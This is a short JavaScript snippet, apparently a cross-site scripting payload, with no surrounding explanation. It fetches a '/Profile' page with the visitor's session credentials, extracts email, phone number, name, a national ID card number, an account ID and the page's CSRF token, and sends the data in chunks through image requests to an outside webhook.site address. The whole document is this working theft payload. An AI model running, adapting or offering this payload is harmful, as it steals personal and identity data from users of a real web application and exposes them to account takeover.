fetch('/Profile',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>{
    var data={
      email:(d.match(/CanEmail":"([^"]+)"/)||[])[1]||'',
      phone:(d.match(/CanHandphone":"([^"]+)"/)||[])[1]||'',
      name:(d.match(/CanName":"([^"]+)"/)||[])[1]||'',
      nik:(d.match(/CardNumber":"([^"]+)"/)||[])[1]||'',
      canId:(d.match(/CanId":(\d+)/)||[])[1]||'',
      csrf:window._CSRFToken
    };
    var json = JSON.stringify(data);
    for(let i=0;i<json.length;i+=1500){
      new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?part='+i+'&d='+encodeURIComponent(json.substring(i,i+1500));
    }
  })